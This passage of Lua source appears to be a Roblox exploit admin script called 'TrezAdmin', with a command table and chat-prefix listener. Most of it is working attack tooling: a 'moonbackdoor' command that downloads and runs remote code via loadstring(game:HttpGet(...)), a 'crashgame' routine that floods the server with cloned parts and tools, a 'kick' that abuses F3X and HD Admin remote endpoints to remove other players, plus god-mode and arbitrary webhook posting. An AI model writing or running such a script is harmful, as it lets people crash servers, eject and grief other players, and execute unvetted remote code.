				end
			end
		end,
		["unloopoof"] = function()
			Notice:Invoke("Loop Oof Stopped")
			isOofing = false
		end,
		["moonbackdoor"] = function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/G4mg1/MoonBackdoor/refs/heads/main/README.md"))()
			Notice:Invoke("MoonBackdoor Loaded")
		end,
		["uiscale"] = function(args)
			local player = game.Players.LocalPlayer
			local UIsize = tonumber(args[1])
			if not UIsize then return end

			for _, gui in pairs(player.PlayerGui:GetChildren()) do
				if gui:IsA("ScreenGui") then
					local scale = gui:FindFirstChild("GlobalUIScale")
					if not scale then
						scale = Instance.new("UIScale")
						scale.Name = "GlobalUIScale"
						scale.Parent = gui
					end
					scale.Scale = UIsize
				end
			end
		end,
		["sendwebhook"] = function(args)
			local HttpService = game:GetService("HttpService")
			local WebHookURL :string? = args[1]
			if not WebHookURL or not args[2] then return end

			local WebHookData = table.concat(args, " ", 2)

			local data = {
				["content"] = WebHookData;
				["username"] = "TrezAdmin";
			}

			local success, response = pcall(function()
				HttpService:PostAsync(
					WebHookURL,
					HttpService:JSONEncode(data),
					Enum.HttpContentType.ApplicationJson
				)
			end)
			
			if success and response then
				Notice:Invoke("Webhook sent successfully = "..data.content)
			else
				Notice:Invoke("Failed to send webhook: "..tostring(response))
			end
		end,
		["changename"] = function(args)
			local NewName :string? = args[1]
			if not NewName then return end
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local humanoid = char:WaitForChild("Humanoid")
			humanoid.DisplayName = NewName
			Notice:Invoke("Name changed to "..NewName)
		end,
		["crashgame"] = function(args)
			Notice:Invoke("Crashing game wait!")
			local AmountOfRequest = tonumber(args[1])
			if not AmountOfRequest then return end
			for i,v in pairs(game.Players:GetPlayers()) do
				for i,s in pairs(v.Character:GetChildren()) do
					if s:IsA("BasePart") then
						for i = 1,AmountOfRequest do
							local Clone = s:Clone()
							Clone.Parent = workspace
						end
					end
				end
				for i,v in pairs(v.Backpack:GetDescendants()) do
					if v:IsA("Tool") then
						for i = 1,AmountOfRequest do
							local Clone = v:Clone()
							Clone.Parent = workspace
							Clone:Activate()
						end
					end
				end
			end
		end,
		["kick"] = function(args)
			local targetName = args[1]
			local targetPlayer = game.Players:FindFirstChild(targetName)
			if targetPlayer then
				--- f3x method ---
				local function getf3x()
					for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
						if v:IsA("Tool") then
							return v
						end
					end
					for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
						if v:IsA("Tool") then
							return v
						end
					end
					
					local function InvokeF3X(actionName, ...)
						local F3X = getf3x()
						if not F3X then
							warn("F3X tool not found!")
							return
						end
						return F3X.SyncAPI.ServerEndpoint:InvokeServer(actionName, ...)
					end
					
					local success, err = pcall(function()
						InvokeF3X("remove", {targetPlayer})
					end)
					if success then
						Notice:Invoke("Kicked "..targetPlayer.Name.." using f3x method")
					else
						Notice:Invoke("failed to kick: "..tostring(err))
						-- hd admin method --
						local Hdadminclient = game.ReplicatedStorage:FindFirstChild("HDAdminHDClient")
						local request = Hdadminclient:FindFirstChild("Signals")["RequestCommandSilent"]
						local success, err = pcall(function()
							request:InvokeServer(";kick", {targetPlayer.Name})
						end)
						if success then
							Notice:Invoke("Kicked "..targetPlayer.Name.." using hd admin method")
						else
							Notice:Invoke("failed to kick: "..tostring(err))
						end
					end
				end
			end
		end,
		["laugh"] = function()
			laughsound:Play()
			game.TextChatService.TextChannels.RBXGeneral:SendAsync("/e laugh")
			Notice:Invoke("laughed")
		end,
		["char"] = function(args)
			local Players = game:GetService("Players")

			local function spawnAvatarFromUsername(username)
				local player = Players.LocalPlayer

				local success, userId = pcall(function()
					return Players:GetUserIdFromNameAsync(username)
				end)

				if not success then
					warn("User not found.")
					return
				end

				local success2, description = pcall(function()
					return Players:GetHumanoidDescriptionFromUserId(userId)
				end)

				if not success2 then
					warn("Could not get avatar description.")
					return
				end

				local newChar = Players:CreateHumanoidModelFromDescription(description, Enum.HumanoidRigType.R15)
				newChar.Name = player.Name
				newChar.Parent = workspace

				player.Character = newChar
				workspace.CurrentCamera.CameraSubject = newChar:WaitForChild("Humanoid")

				newChar:MoveTo(workspace.CurrentCamera.CFrame.Position)

				Notice:Invoke("your now "..args[1])
			end

			spawnAvatarFromUsername(args[1])

		end,
		["antikill"] = function()
			
			local player :Players? = game.Players.LocalPlayer
			local Char = player.Character or player.CharacterAdded:Wait()
			local Human : Humanoid? = Char["Humanoid"]
			Notice:Invoke("antikill enabled")
			IsAntien = true
			while IsAntien do
				wait(0.05)
				Human.Health = 100
				if not IsAntien then
					break
				end
			end
			
		end,
		["unantikill"] = function()
			Notice:Invoke("antikill disabled")
			IsAntien = false
		end,
		["bright"] = function(args)
			Bright.Brightness = tonumber(args[1])
			Notice:Invoke("Brightness changed to "..args[1])
		end,
		
		["btools"] = function()
			local btools = game:GetObjects("rbxassetid://73095244")[5]
			btools.Parent = game.Players.LocalPlayer.Backpack
		end,
		["call"] = function(args)
			local SocialService = game:GetService("SocialService")
			local success, canInvite = pcall(function()
				return SocialService:CanSendCallInviteAsync(game.Players.LocalPlayer)
			end)
			if success and canInvite then
				SocialService:PromptPhoneBook(game.Players.LocalPlayer, "")
			else
				Notice:Invoke("It seems you're not able to call anyone. Sorry!")
			end
		end,
	}
	
	SourceBox.FocusLost:Connect(function(enterPressed)
		if not enterPressed then return end
		if SourceBox.Text == "" then return end
	
		local args = string.split(SourceBox.Text, " ")
		local cmd = string.lower(args[1])
		table.remove(args, 1)
	
		if CmdsActions[cmd] then
			CmdsActions[cmd](args)
		else
			Notice:Invoke("Unknown command: "..cmd)
		end
	
		SourceBox.Text = ""
	end)
	
	local TextchatService = game:GetService("TextChatService")
	local TextChatService = game:GetService("TextChatService")

	local TextChatService = game:GetService("TextChatService")

	TextChatService.MessageReceived:Connect(function(msg)
		local prefix = "?"
		if string.sub(msg.Text, 1, 1) == prefix then
			local textWithoutPrefix = string.sub(msg.Text, 2)
			local firstSpace = string.find(textWithoutPrefix, " ")
			local cmd, argsText

			if firstSpace then
				cmd = string.lower(string.sub(textWithoutPrefix, 1, firstSpace - 1))
				argsText = string.sub(textWithoutPrefix, firstSpace + 1)
			else
				cmd = string.lower(textWithoutPrefix)
				argsText = "" 
			end

			if CmdsActions[cmd] then
				CmdsActions[cmd](argsText) 
			else
				Notice:Invoke("Unknown command: "..cmd)
			end
		end
	end)


	
end;
task.spawn(C_4);
-- StarterGui.Trez.Frame.TextBox.AnimateService
local function C_6()
local script = G2L["6"];
	SourceBox = script.Parent
	Frame = SourceBox.Parent
	UserInput = game:GetService("UserInputService")
	
	Frame:TweenPosition(UDim2.new(0.825, 0, 0.947, 0))
	
	SourceBox:GetPropertyChangedSignal("Text"):Connect(function()
		if SourceBox.Text == "" then
			return
		else
			Frame:TweenPosition(UDim2.new(0.825, 0, 0.697, 0))
		end
	end)
	
	
	SourceBox.Focused:Connect(function()
		Frame:TweenPosition(UDim2.new(0.825, 0, 0.697, 0))
	end)
	
	
	SourceBox.FocusLost:Connect(function()
		Frame:TweenPosition(UDim2.new(0.825, 0, 0.947, 0))
	end)
	
	UserInput.InputBegan:Connect(function(Input)
		if Input.KeyCode == Enum.KeyCode.Semicolon then
			Frame:TweenPosition(UDim2.new(0.825, 0, 0.697, 0))
			SourceBox:CaptureFocus()
			SourceBox.Text = ""
		end
	end)
	
	while true do
		wait(math.random(1,5))
		if string.find(SourceBox.Text, "") then
			Frame:TweenPosition(UDim2.new(0.825, 0, 0.947, 0))
		end
	end
	
end;
task.spawn(C_6);
-- StarterGui.Trez.Notice.InputShow
local function C_c()
local script = G2L["c"];
	Notice = script.Parent.Parent.NoticeFunc
	Notice.OnInvoke = function(...)
		script.Parent:TweenPosition(UDim2.new(0.655, 0,0.955, 0))
		script.Parent.TextLabel.Text = table.concat({...}, " ")
		wait(5)
		script.Parent:TweenPosition(UDim2.new(0.655, 0,1.015, 0))
	end
end;
task.spawn(C_c);

return G2L["1"], require;
